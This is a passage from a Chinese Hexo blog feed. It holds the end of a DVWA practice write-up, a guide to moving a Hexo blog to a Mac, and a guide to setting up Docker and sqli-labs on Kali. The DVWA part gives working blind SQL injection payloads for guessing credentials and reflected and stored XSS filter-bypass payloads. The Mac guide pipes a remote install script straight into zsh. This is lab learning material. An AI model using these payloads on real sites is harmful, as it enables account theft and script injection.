alt="image-20210706154843388"></p><p><strong>admin</strong></p><p>第二个用户：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and ascii(substr((select user from users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>#<br></code></pre></td></tr></table></figure><p><strong>gordonb</strong></p><p>就不一个一个试了。</p><h3 id="（7）猜解密码"><a href="#（7）猜解密码" class="headerlink" title="（7）猜解密码"></a><strong>（7）猜解密码</strong></h3><p>猜解admin的密码，也就是password的表中的第一个。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and ascii(substr((select password from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>#<br></code></pre></td></tr></table></figure><p>结果为admin。</p><h2 id="2-medium-6"><a href="#2-medium-6" class="headerlink" title="2.medium"></a>2.medium</h2><p>界面：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706160610549.png" alt="image-20210706160610549"></p><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706160533944.png" alt="image-20210706160533944"></p><p>post类型。</p><p>bp抓包进行注入。</p><p>测试后发现，为数字型注入。</p><p>本身没有什么过滤，只要注意语句格式为数字型注入，还有单引号被过滤（和sql注入一样用十六进制绕过），其他没有什么不同。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706160856446.png" alt="image-20210706160856446"></p><h2 id="3-high-6"><a href="#3-high-6" class="headerlink" title="3.high"></a>3.high</h2><p>界面：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706161153872.png" alt="image-20210706161153872"></p><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706161221694.png" alt="image-20210706161221694"></p><p>只有随机sleep的限制。</p><p>弹出对sqlmap起到了一定的限制。</p><p>测试后为字符型注入，其他的操作和low级别并没有什么不同。</p><h2 id="4-impossible-6"><a href="#4-impossible-6" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706161852820.png" alt="image-20210706161852820"></p><p>同样和sql注入的impossible级别差别不大。</p><p>获取token并验证，pdo机制，使用了sql预编译，数据每次只返回一条。</p><p>暂时无方法绕过。</p><h1 id="九、xss（reflected）反射型"><a href="#九、xss（reflected）反射型" class="headerlink" title="九、xss（reflected）反射型"></a>九、xss（reflected）反射型</h1><h2 id="1-low-7"><a href="#1-low-7" class="headerlink" title="1.low"></a>1.low</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702173105531.png" alt="image-20210702173105531"></p><p>输入name，输出name。</p><p>没有任何过滤。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>成功弹出。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702173429626.png" alt="image-20210702173429626"></p><h2 id="2-medium-7"><a href="#2-medium-7" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702174437664.png" alt="image-20210702174437664"></p><p>使用str_replace限制了<code>&lt;script&gt;</code>标签。</p><p>可以用<strong>其他标签</strong>进行代替。</p><p>例如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg/<span class="hljs-attribute">onload</span>=alert(1)&gt;<br>&lt;img <span class="hljs-attribute">src</span>=0 <span class="hljs-attribute">onerror</span>=alert(&quot;xss&quot;)&gt;  <br></code></pre></td></tr></table></figure><p>由于str_replace只进行一次转换，所以也可以使用<strong>双写绕过</strong>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;sc<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>ript&gt;alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702175353915.png" alt="image-20210702175353915"></p><h2 id="3-high-7"><a href="#3-high-7" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702175557494.png" alt="image-20210702175557494"></p><p>script标签的被过滤了。</p><p>使用<strong>其他标签</strong>即可绕过。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702175758750.png" alt="image-20210702175758750"></p><h2 id="4-impossible-7"><a href="#4-impossible-7" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702180030280.png" alt="image-20210702180030280"></p><p>htmlspecialchars — 将预定义的字符（**&amp;<strong>、</strong>“<strong>、</strong>‘<strong>、</strong>&lt;**、**&gt;**） 转换为 HTML 实体。</p><p>也就意味着一些特殊的标签将无法生效。</p><p>xss漏洞无法利用，但查询后发现也有绕过的可能性，例如htmlspecialchars未能奏效的场景（详见<a href="htmlspecialchars">知乎</a>）。但该方法对此场景未能生效。</p><h1 id="十、xss（stored）存储型"><a href="#十、xss（stored）存储型" class="headerlink" title="十、xss（stored）存储型"></a>十、xss（stored）存储型</h1><h2 id="1-low-8"><a href="#1-low-8" class="headerlink" title="1.low"></a>1.low</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706102921672.png" alt="image-20210706102921672"></p><p>trim(string,charlist) ： 移除string字符两侧的预定义字符，预定义字符包括\t 、 \n 、\x0B 、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</p><p>stripslashes（）删除反斜杠。</p><p>mysql_real_escape_string() 对特殊字符进行转义。</p><p>实际上对输入的内容并没有进行xss过滤。</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/111/</span>)</span></span><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>;</span></span></span><br></code></pre></td></tr></table></figure><p>每一次提交都会弹出窗口。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706104324274.png" alt="image-20210706104324274"></p><h2 id="2-medium-8"><a href="#2-medium-8" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706105010065.png" alt="image-20210706105010065"></p><p>addslashes() 函数返回在预定义字符（**&amp;<strong>、</strong>“<strong>、</strong>‘<strong>、</strong>&lt;**、**&gt;**） 之前添加反斜杠的字符串。</p><p>strip_tag()删除字符串中的html标签。</p><p>htmlspecialchars — 将预定义的字符转换为 HTML 实体。</p><p>上传<code>alert(&#39;1&#39;)</code>,发现单引号被反斜杠过滤。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706105931652.png" alt="image-20210706105931652"></p><p>message过滤掉了所有的标签，但name只替换了script，而且过滤的是小写。</p><p>尝试从name进行xss攻击（大小写），但name限制只能输入10个字符。</p><p>f12打开查看器，修改<strong>maxlength</strong>。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111059697.png" alt="image-20210706111059697"></p><p>构造语句：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span><br></code></pre></td></tr></table></figure><p>攻击成功：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111159270.png" alt="image-20210706111159270"></p><h2 id="3-high-8"><a href="#3-high-8" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111247688.png" alt="image-20210706111247688"></p><p>name的script完全被过滤。</p><p>使用其他标签进行攻击：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg/<span class="hljs-attribute">onload</span>=alert(1)&gt;<br></code></pre></td></tr></table></figure><p>其他的操作和medium基本一致。</p><p>成功：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111555026.png" alt="image-20210706111555026"></p><h2 id="4-impossible-8"><a href="#4-impossible-8" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>源码：<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210706111658731.png" alt="image-20210706111658731"></p><p>需要获取和验证token，并添加了pdo机制。</p><p>name也同样使用htmlspecialchars进行了过滤。</p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p>大佬很多，好文章很多，继续学习！</p><p>使用docker搭建dvwa环境：<a href="https://zhuanlan.zhihu.com/p/126668420">https://zhuanlan.zhihu.com/p/126668420</a></p><p>php函数参考：<a href="https://www.w3school.com.cn/php/">https://www.w3school.com.cn/php/</a></p><p>什么是token：<a href="https://www.jianshu.com/p/24825a2683e6">https://www.jianshu.com/p/24825a2683e6</a></p><p>burpsuit中attack的四种模式的区别：<a href="https://blog.csdn.net/u012804180/article/details/52015224">https://blog.csdn.net/u012804180/article/details/52015224</a></p><p>Web安全-命令执行漏洞：<a href="https://segmentfault.com/a/1190000016056455">https://segmentfault.com/a/1190000016056455</a></p><p>dvwa-csrf：<a href="https://www.jianshu.com/p/e65ede7d7026">https://www.jianshu.com/p/e65ede7d7026</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/82918141?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162495828916780265419802%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162495828916780265419802&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-82918141.pc_search_result_before_js&utm_term=dvwa+csrf&spm=1018.2226.3001.4187">DVWA之CSRF(跨站请求伪造攻击)</a></p><p>dvwa 1.10 High等级的CSRF另类通关法：<a href="https://www.freebuf.com/articles/web/203301.html">https://www.freebuf.com/articles/web/203301.html</a></p><p>Web安全实战系列：文件包含漏洞：<a href="https://www.freebuf.com/articles/web/182280.html">https://www.freebuf.com/articles/web/182280.html</a></p><p>php伪协议总结：<a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p><p>一步一步学习dvwa渗透测试：<a href="https://zhuanlan.zhihu.com/p/105549209">https://zhuanlan.zhihu.com/p/105549209</a></p><p>sql预编译：<a href="https://www.cnblogs.com/micrari/p/7112781.html">https://www.cnblogs.com/micrari/p/7112781.html</a></p><p>dvwa之xss：<a href="https://blog.csdn.net/qq_36119192/article/details/82935895">https://blog.csdn.net/qq_36119192/article/details/82935895</a></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
      <tag>dvwa</tag>
      
      <tag>docker</tag>
      
      <tag>mac</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo博客｜win10迁移到Mac</title>
    <link href="/2021/06/16/old/hexo%E5%8D%9A%E5%AE%A2%EF%BD%9Cwindows%E8%BF%81%E7%A7%BB%E5%88%B0mac/"/>
    <url>/2021/06/16/old/hexo%E5%8D%9A%E5%AE%A2%EF%BD%9Cwindows%E8%BF%81%E7%A7%BB%E5%88%B0mac/</url>
    
    <content type="html"><![CDATA[<p>最近换了新电脑，所以打算把博客也迁移一下。</p><h1 id="Win10转移到mac"><a href="#Win10转移到mac" class="headerlink" title="Win10转移到mac"></a>Win10转移到mac</h1><h2 id="1-安装brew"><a href="#1-安装brew" class="headerlink" title="1.安装brew"></a>1.安装brew</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>zsh -c <span class="hljs-string">&quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210615120303981.png" alt="image-20210615120303981"></p><p>安装完后重启终端。</p><span id="more"></span><p>查看是否安装完成。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">brew <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210615120740810.png" alt="image-20210615120740810"></p><h2 id="2-安装git和node-js"><a href="#2-安装git和node-js" class="headerlink" title="2.安装git和node.js"></a>2.安装git和node.js</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">brew </span><span class="hljs-keyword">install </span>git<br><span class="hljs-keyword">brew </span><span class="hljs-keyword">install </span>node<br></code></pre></td></tr></table></figure><h2 id="3-安装hexo"><a href="#3-安装hexo" class="headerlink" title="3.安装hexo"></a>3.安装hexo</h2><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> -g hexo<br></code></pre></td></tr></table></figure><h2 id="4-初始化hexo"><a href="#4-初始化hexo" class="headerlink" title="4.初始化hexo"></a>4.初始化hexo</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> blog <br><span class="hljs-built_in">cd</span> blog<br>hexo init<br></code></pre></td></tr></table></figure><p>访问localhost:4000查看是否成功初始化：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210615142024454.png" alt="image-20210615142024454"></p><h2 id="5-生成ssh密钥"><a href="#5-生成ssh密钥" class="headerlink" title="5.生成ssh密钥"></a>5.生成ssh密钥</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">ssh-keygen -t rsa -C <span class="hljs-string">&quot;youremail@example.com&quot;</span> <span class="hljs-comment">#注册邮箱</span><br></code></pre></td></tr></table></figure><p>运行后进入.ssh文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ～/.ssh<br></code></pre></td></tr></table></figure><p>查看id_rsa.pub文件，复制里面的所有内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> id_rsa.pub<br></code></pre></td></tr></table></figure><p>网页打开github设置：<strong>setting -》 ssh and gpg keys</strong>，添加新的ssh key，把刚才复制的内容粘贴进去。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210615144012871.png" alt="image-20210615144012871"></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210615144428044.png" alt="image-20210615144428044"></p><p>保存后，邮箱会收到一封验证邮件，记得通过验证。</p><h2 id="6-文件配置转移"><a href="#6-文件配置转移" class="headerlink" title="6.文件配置转移"></a>6.文件配置转移</h2><p>将win10里博客根目录下的：</p><p><strong>_config.yml,</strong></p><p><strong>scaffolds,</strong></p><p><strong>source,</strong></p><p><strong>themes</strong></p><p>复制并覆盖到mac博客根目录下。</p><hr><p><strong>🌟关于如何windows如何传输文件到mac</strong></p><p>同一网络下。</p><p>windows：文件夹属性 -&gt; 共享 -&gt; 共享（得到网路路径）</p><p>mac：访达 -&gt; 连接服务器 -&gt; 输入smb:&#x2F;&#x2F;网络路径</p><hr><h2 id="7-个人信息设置"><a href="#7-个人信息设置" class="headerlink" title="7.个人信息设置"></a>7.个人信息设置</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lua">git <span class="hljs-built_in">config</span> <span class="hljs-comment">--global user.name &quot;yourname”</span><br>git <span class="hljs-built_in">config</span> <span class="hljs-comment">--global user.email youremail@example.com</span><br></code></pre></td></tr></table></figure><p>使用hexo s、hexo g、hexo d测试，无报错即成功。</p><h1 id="hexo-picgo-腾讯cos图床"><a href="#hexo-picgo-腾讯cos图床" class="headerlink" title="hexo+picgo+腾讯cos图床"></a>hexo+picgo+腾讯cos图床</h1><p>之前每次图片都要手传，连接都是手替换。</p><p>后来发现居然有方便的做法。</p><p>picgo：<a href="https://molunerfinn.com/PicGo/">https://molunerfinn.com/PicGo/</a></p><h2 id="1-腾讯云"><a href="#1-腾讯云" class="headerlink" title="1.腾讯云"></a>1.腾讯云</h2><p>打开腾讯云页面。</p><p>点击头像，选择<strong>访问管理 -〉访问密钥 -〉api密钥管理</strong>。</p><p>选择新建密钥，会生成appid、secretid、secretkey。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210616024543125.png" alt="image-20210616024543125"></p><p>进入cos产品界面。</p><p>创建一个存储桶（如果原来有桶也可以不用创建），权限选择公有读私有写。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210616030400440.png" alt="image-20210616030400440"></p><p>域名信息便是访问的地址。</p><p>记录下基本信息的<strong>存储桶名称和所属地域</strong>（例如ap-shenzhen-fsi）。</p><h2 id="2-picgo"><a href="#2-picgo" class="headerlink" title="2.picgo"></a>2.picgo</h2><p>进入图床设置，选择cos版本为v5，填写相关信息。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210616024816756.png" alt="image-20210616024816756"></p><h2 id="3-typore"><a href="#3-typore" class="headerlink" title="3.typore"></a>3.typore</h2><p>打开<strong>格式 -〉图像 -〉全局图片设置</strong></p><p>设置插入图片时为上传图片，上传服务为picgo.app</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210616031411224.png" alt="image-20210616031411224"></p><p>完成！</p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p>转移：<a href="https://blog.csdn.net/qq_39153421/article/details/89362432?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">https://blog.csdn.net/qq_39153421/article/details/89362432?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control</a></p><p>picgo+cos图床：<a href="https://blog.csdn.net/qq_41684621/article/details/114128635">https://blog.csdn.net/qq_41684621/article/details/114128635</a></p>]]></content>
    
    
    <categories>
      
      <category>博客相关</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
      <tag>hexo</tag>
      
      <tag>mac</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali搭建docker</title>
    <link href="/2021/06/15/old/kali%E6%90%AD%E5%BB%BAdocker/"/>
    <url>/2021/06/15/old/kali%E6%90%AD%E5%BB%BAdocker/</url>
    
    <content type="html"><![CDATA[<h1 id="kali搭建docker"><a href="#kali搭建docker" class="headerlink" title="kali搭建docker"></a>kali搭建docker</h1><p>1.安装https协议,ca证书,dirmngr</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> update<br>sudo apt-<span class="hljs-built_in">get</span> install -y apt-transport-https ca-certificates<br>sudo apt-<span class="hljs-built_in">get</span> install dirmngr<br></code></pre></td></tr></table></figure><p>2.添加gpg密钥，添加更新源</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -fsSL https:<span class="hljs-regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="hljs-regexp">/docker-ce/</span>linux<span class="hljs-regexp">/debian/g</span>pg | sudo apt-key add -<br>echo <span class="hljs-string">&#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27;</span> | sudo tee <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list.d/</span>docker.list<br></code></pre></td></tr></table></figure><span id="more"></span><p>3.系统更新</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sudo apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span><br></code></pre></td></tr></table></figure><p>4.安装docker社区版</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> docker-ce<br></code></pre></td></tr></table></figure><p>5.启动docker服务器</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">service docker <span class="hljs-literal">start</span><br></code></pre></td></tr></table></figure><p>6.安装compose</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> docker-compose<br></code></pre></td></tr></table></figure><p>7.docker</p><p>![image-20210613102042719](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210613102042719.png)</p><h1 id="kali测试安装sqli-labs"><a href="#kali测试安装sqli-labs" class="headerlink" title="kali测试安装sqli-labs"></a>kali测试安装sqli-labs</h1><p>1.查找相关安装镜像</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker search sqli-labs</span><br></code></pre></td></tr></table></figure><p>![image-20210614194536706](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614194536706.png)</p><p>2.拉取镜像</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> pull xxx（xxx为搜索到的镜像名）<br></code></pre></td></tr></table></figure><p>![image-20210614234537359](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614234537359.png)</p><p>3.查看本地镜像</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker images</span><br></code></pre></td></tr></table></figure><p>![image-20210614234819046](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614234819046.png)</p><p>4.启动镜像</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">docker run -<span class="hljs-selector-tag">dt</span> <span class="hljs-attr">--name</span> xxx -<span class="hljs-selector-tag">p</span> <span class="hljs-number">300</span>:<span class="hljs-number">80</span> <span class="hljs-attr">--rm</span> xxx<br></code></pre></td></tr></table></figure><p>-d：后台运行容器，并返回容器id</p><p>-t：分配一个虚拟的终端</p><p>–name：为容器指定一个名字</p><p>-p：指定端口映射，格式（<strong>主机端口:容器端口</strong>）</p><p>–rm：容器退出时，自动删除容器</p><p>5.访问靶场</p><p>![image-20210615021409240](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210615021409240.png)</p><p>6.关闭容器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> stop<span class="hljs-meta"> [id]</span><br></code></pre></td></tr></table></figure><h1 id="出现的问题及解决方案"><a href="#出现的问题及解决方案" class="headerlink" title="出现的问题及解决方案"></a>出现的问题及解决方案</h1><h2 id="1-拉取镜像时出现无法找到最新版本"><a href="#1-拉取镜像时出现无法找到最新版本" class="headerlink" title="1.拉取镜像时出现无法找到最新版本"></a>1.拉取镜像时出现无法找到最新版本</h2><p>![image-20210614195833693](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614195833693.png)</p><p>1.去docker hub查询相关镜像</p><p>网址：<a href="https://hub.docker.com/">https://hub.docker.com/</a></p><p>![image-20210614201008832](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614201008832.png)</p><p>2.选择镜像的最新版本下载</p><p>![image-20210614200510298](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614200510298.png)</p><p>![image-20210614200350913](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614200350913.png)</p><p>![image-20210614201324219](&#x2F;Users&#x2F;songyang&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210614201324219.png)</p><h2 id="2-arm架构镜像不兼容"><a href="#2-arm架构镜像不兼容" class="headerlink" title="2.arm架构镜像不兼容"></a>2.arm架构镜像不兼容</h2><p><strong>WARNING: The requested image’s platform (linux&#x2F;amd64) does not match the detected host platform (linux&#x2F;arm64&#x2F;v8) and no specific platform was requested</strong></p><p>一开始搞了半天也不知道咋处理，百度了下也很少有人遇见这个问题。</p><p>试着翻译了下是amd64和arm64的问题。</p><p>看样子只有mac才会出这个问题，见鬼的m1芯片。</p><p>macbook可使用<strong>rosetta</strong>，但parallelsdesktop虚拟机里arm版本的kali暂时还无法解决这个问题。</p><p>【关于如何在MacBook安装kali，可以参考知乎的这个问题：<a href="https://www.zhihu.com/question/434007164%E3%80%91">https://www.zhihu.com/question/434007164】</a></p><p>如果使用mac，直接搭建docker比较方便，无需在虚拟机里搭建。</p><p>但还是想尝试找一下解决方案。</p><p>等找到的时候，再写一篇文章。</p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p>kali搭建sqli-labs：<a href="https://blog.csdn.net/weixin_42420804/article/details/106192827">https://blog.csdn.net/weixin_42420804/article/details/106192827</a></p><p>解决docker无法拉取问题：<a href="https://www.pianshen.com/article/9349196111/">https://www.pianshen.com/article/9349196111/</a></p><p>docker入门到精通：<a href="http://www.tianfeiyu.com/?p=2394">http://www.tianfeiyu.com/?p=2394</a></p><p>docker命令大全：<a href="https://www.runoob.com/docker/docker-command-manual.html">https://www.runoob.com/docker/docker-command-manual.html</a></p>]]></content>
    
    
    <categories>
      
      <category>杂</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali</tag>
      
      <tag>旧文章</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>培训day1-7</title>
    <link href="/2020/12/05/old/%E5%9F%B9%E8%AE%ADday1-7/"/>
    <url>/2020/12/05/old/%E5%9F%B9%E8%AE%ADday1-7/</url>
    
